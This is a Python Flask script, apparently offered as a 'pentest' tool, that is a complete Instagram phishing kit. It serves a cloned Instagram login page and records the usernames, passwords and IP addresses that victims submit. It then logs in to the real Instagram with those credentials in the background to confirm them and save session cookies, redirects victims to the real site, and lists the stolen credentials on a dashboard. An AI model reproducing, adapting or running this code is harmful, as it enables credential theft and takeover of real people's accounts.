from flask import Flask, request, jsonify
import sqlite3
import datetime as dt
import time
import requests
import json
import threading

app = Flask(__name__)
DB_FILE = 'pentest_captures.db'
ig_session = requests.Session()

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, username TEXT, password TEXT,
                  ip TEXT, ua TEXT, success TEXT, cookies TEXT)''')
    conn.commit()
    conn.close()

init_db()

def bot_login(username, password):
    """🤖 IG Auto-Login (Fixed)"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': '*/*'
        }
        
        # Get CSRF
        r = ig_session.get('https://www.instagram.com/accounts/login/')
        csrf = ig_session.cookies.get('csrftoken', '')
        headers['X-CSRFToken'] = csrf
        
        # Login
        timestamp = str(int(time.time()))
        enc_pass = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
        
        data = {
            'username': username,
            'enc_password': enc_pass,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        r = ig_session.post('https://www.instagram.com/accounts/login/ajax/',
                           data=data, headers=headers)
        result = r.json()
        success = result.get('authenticated', False)
        
        return success, dict(ig_session.cookies), result
    except:
        return False, {}, {}

@app.route('/')
def phish_page():
    return '''
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:44px 40px 34px;width:350px;}h1{font-size:42px;font-weight:600;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:33px;}
input{width:100%;height:36px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;padding:9px 0 7px 8px;font-size:14px;margin-bottom:6px;box-sizing:border-box;}input:focus{border-color:#b2b2b2;outline:none;background:#fff;}
.btn{width:100%;height:30px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:600;cursor:pointer;font-size:14px;margin:8px 0;} .btn:hover{background:#1877f2;}.btn:disabled{background:#b2b2b2;cursor:not-allowed;}
#status{text-align:center;color:#262626;font-size:14px;margin-top:20px;}</style></head><body>
<div class="login-box"><h1>Instagram</h1>
<form id="login"><input name="username" placeholder="Phone number, username, or email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit" class="btn" id="btn">Log in</button></form><div id="status"></div></div>
<script>document.getElementById('login').onsubmit=async e=>{e.preventDefault();const btn=document.getElementById('btn'),status=document.getElementById('status');btn.disabled=true;btn.textContent='Logging in...';status.textContent='⏳ Checking credentials...';try{const fd=new FormData(e.target);const r=await fetch('/capture',{method:'POST',body:fd});const d=await r.json();if(d.success){status.textContent='✅ Success! Loading...';setTimeout(()=>location.href=d.redirect||'https://www.instagram.com/',1500);}}catch(e){status.textContent='❌ Error';}finally{btn.disabled=false;btn.textContent='Log in';}};</script></body></html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    try:
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        
        if not username or not password:
            return jsonify({'success': False})
        
        # SAVE RAW (FIXED datetime)
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO captures (timestamp, username, password, ip, ua, success) VALUES (?, ?, ?, ?, ?, 'pending')", 
                  (dt.datetime.now().isoformat(), username, password, ip, ua))
        capture_id = c.lastrowid
        conn.commit()
        conn.close()
        
        print(f"\n🎣 LIVE HIT #{capture_id}: {username}:{password}")
        print(f"🌐 {ip}")
        
        # BOT THREAD (runs in background)
        def verify():
            try:
                success, cookies, result = bot_login(username, password)
                status = '✅ SUCCESS' if success else '❌ FAILED'
                
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                cookies_json = json.dumps(cookies) if success else ''
                c.execute("UPDATE captures SET success=?, cookies=? WHERE id=?", (status, cookies_json, capture_id))
                conn.commit()
                conn.close()
                
                print(f"🤖 {username}: {status}")
                if success:
                    print(f"🍪 Cookies: {list(cookies.keys())}")
            except Exception as e:
                print(f"❌ Bot error: {e}")
        
        threading.Thread(target=verify, daemon=True).start()
        
        return jsonify({'success': True, 'redirect': '/loading'})
        
    except Exception as e:
        print(f"❌ Capture error: {e}")
        return jsonify({'success': False})

@app.route('/loading')
def loading():
    return '''
<!DOCTYPE html><html><body style="background:#fafafa;font-family:Arial;text-align:center;padding:100px;">
<h2>🔄 Logging you in...</h2><p>Just a moment while we verify your account</p>
<script>setTimeout(()=>location.href='https://www.instagram.com/',2500);</script></body></html>'''

@app.route('/data_captured')
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 15")
    rows = c.fetchall()
    conn.close()
    
    html = f'''
<!DOCTYPE html><html><head><title>PENTEST DASHBOARD</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px;}}h1{{color:#0f0;}}
table{{width:100%;border-collapse:collapse;}}th,td{{border:1px solid #333;padding:8px;text-align:left;}}
th{{background:#222;}}.success{{color:#0f0;}}.failed{{color:#f00;}}.copy{{background:#0066cc;padding:4px;border-radius:3px;cursor:pointer;}}</style></head>
<body><h1>🎣 CAPTURES ({len(rows)})</h1><a href="/" style="color:#0f0;">← Phish Page</a>
<table><tr><th>ID</th><th>Time</th><th>User</th><th>Pass</th><th>IP</th><th>Status</th></tr>'''
    
    for row in rows:
        status_badge = f'<span class="success">{row[6]}</span>' if row[6] and 'SUCCESS' in row[6] else f'<span class="failed">{row[6] or "pending"}</span>'
        html += f'<tr><td>{row[0]}</td><td>{row[1][:19]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{status_badge}</td></tr>'
    
    html += '</table></body></html>'
    return html

if __name__ == '__main__':
    print("🔥 FIXED PENTEST CHAIN v3.1")
    print("🌐 http://127.0.0.1:5000")
    print("📊 http://127.0.0.1:5000/data_captured")
    app.run(host='0.0.0.0', port=5000, debug=True)